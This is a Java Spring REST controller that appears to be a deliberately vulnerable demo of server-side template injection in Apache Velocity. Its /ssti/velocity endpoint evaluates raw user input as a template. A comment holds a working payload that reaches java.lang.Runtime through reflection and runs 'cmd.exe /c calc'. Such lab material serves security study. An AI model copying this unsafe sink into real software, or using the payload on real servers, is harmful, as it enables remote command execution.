package com.example.springSec.Controller;


import lombok.AccessLevel;
import lombok.RequiredArgsConstructor;
import lombok.experimental.FieldDefaults;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.Velocity;
import org.apache.velocity.app.VelocityEngine;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.io.StringWriter;
import java.lang.module.Configuration;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;

@RestController
@RequestMapping("/ssti")
@RequiredArgsConstructor
@FieldDefaults(level = AccessLevel.PRIVATE, makeFinal = true)
public class SSTIController {

    @GetMapping("/velocity")
    public String velocity(@RequestParam String input) {
        Properties props = new Properties();
//        props.setProperty("runtime.log.logsystem.class", "org.apache.velocity.runtime.log.NullLogChute"); // Tắt logging
        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.init(props);

        VelocityContext context = new VelocityContext();

        StringWriter writer = new StringWriter();
        Velocity.evaluate(context, writer, "test", input);

        //payload clear text: #set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd.exe /c calc")
        System.out.println(writer);
        return "Xin chao " + writer;
    }


}
